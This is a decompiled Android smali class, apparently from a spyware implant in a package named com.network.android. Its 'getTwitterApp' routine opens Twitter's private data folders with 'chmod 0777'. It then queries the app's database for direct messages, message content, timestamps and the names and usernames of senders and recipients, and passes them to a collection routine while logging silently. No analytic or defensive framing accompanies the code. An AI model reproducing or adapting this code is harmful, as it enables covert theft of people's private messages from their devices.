.class public final Lcom/network/android/d/g;
.super Lcom/network/android/p;


# static fields
.field protected static final c:Ljava/util/regex/Pattern;

.field protected static final d:Ljava/util/Map;

.field static final e:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 2

    const-string v0, "\\d{4,}+\\-\\d+\\.db$"

    invoke-static {v0}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;)Ljava/util/regex/Pattern;

    move-result-object v0

    sput-object v0, Lcom/network/android/d/g;->c:Ljava/util/regex/Pattern;

    new-instance v0, Lcom/network/android/d/h;

    invoke-direct {v0}, Lcom/network/android/d/h;-><init>()V

    sput-object v0, Lcom/network/android/d/g;->d:Ljava/util/Map;

    const-string v1, "timestamp"

    invoke-interface {v0, v1}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    sput-object v0, Lcom/network/android/d/g;->e:Ljava/lang/String;

    return-void
.end method

.method public static a(Landroid/os/Handler;Landroid/content/Context;Z)V
    .locals 14

    :try_start_0
    const-string v0, "getTwitterApp getTwitterApp start"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const-string v0, "/data/data/com.twitter.android/databases/"

    sget-object v1, Lcom/network/android/d/g;->c:Ljava/util/regex/Pattern;

    const-string v2, "twitter"

    invoke-static {v0, v1, v2}, Lcom/network/android/d/g;->a(Ljava/lang/String;Ljava/util/regex/Pattern;Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v13

    :goto_0
    invoke-interface {v13}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-interface {v13}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Ljava/lang/String;

    const-string v3, "twitter"

    const-string v4, "/data/data/com.twitter.android/"

    const-string v6, "SELECT messages._id, messages.type, messages.msg_id, messages.content, messages.created, messages.sender_id, messages.recipient_id, messages.thread, s.name, s.username, r.name, r.username FROM messages JOIN users s ON messages.sender_id = s.user_id JOIN users r ON messages.recipient_id = r.user_id"

    const-string v7, "messages.created"

    const-string v8, "chmod 0777 /data/data/com.twitter.android; chmod 0777 /data/data/com.twitter.android/databases; "

    sget-object v9, Lcom/network/android/d/g;->e:Ljava/lang/String;

    sget-object v10, Lcom/network/android/d/g;->d:Ljava/util/Map;

    const/16 v11, 0xc3c

    new-instance v0, Ljava/io/File;

    invoke-direct {v0, v5}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v12

    move-object v0, p0

    move-object v1, p1

    move/from16 v2, p2

    invoke-static/range {v0 .. v12}, Lcom/network/android/d/g;->a(Landroid/os/Handler;Landroid/content/Context;ZLjava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/util/Map;SLjava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "twittergetTwitterApp GetContentIM exception- "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    :goto_1
    return-void

    :cond_0
    :try_start_1
    const-string v0, "getTwitterApp GetContentIM end"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_1
.end method
